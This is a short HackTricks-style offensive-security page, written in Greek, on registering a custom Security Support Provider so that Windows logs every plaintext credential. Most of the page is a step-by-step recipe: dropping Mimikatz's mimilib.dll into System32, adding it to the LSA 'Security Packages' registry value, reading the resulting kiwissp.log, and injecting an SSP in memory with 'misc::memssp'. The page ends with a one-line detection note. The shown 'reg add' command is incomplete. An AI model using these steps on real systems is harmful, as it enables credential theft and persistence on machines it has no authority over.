# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **καταγράψετε** σε **καθαρό κείμενο** τα **διαπιστευτήρια** που χρησιμοποιούνται για την πρόσβαση στη μηχανή.

#### Mimilib

Μπορείτε να χρησιμοποιήσετε το δυαδικό αρχείο `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράψει μέσα σε ένα αρχείο όλα τα διαπιστευτήρια σε καθαρό κείμενο.**\
Ρίξτε το dll στο `C:\Windows\System32\`\
Πάρτε μια λίστα με τα υπάρχοντα LSA Security Packages:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Προσθέστε το `mimilib.dll` στη λίστα Παρόχων Υποστήριξης Ασφαλείας (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Και μετά από μια επανεκκίνηση, όλα τα διαπιστευτήρια μπορούν να βρεθούν σε καθαρό κείμενο στο `C:\Windows\System32\kiwissp.log`

#### Στη μνήμη

Μπορείτε επίσης να το εισάγετε απευθείας στη μνήμη χρησιμοποιώντας το Mimikatz (σημειώστε ότι μπορεί να είναι λίγο ασταθές/μη λειτουργικό):
```powershell
privilege::debug
misc::memssp
```
Αυτό δεν θα επιβιώσει από επανεκκινήσεις.

#### Μετριασμός

Event ID 4657 - Έλεγχος δημιουργίας/αλλαγής του `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
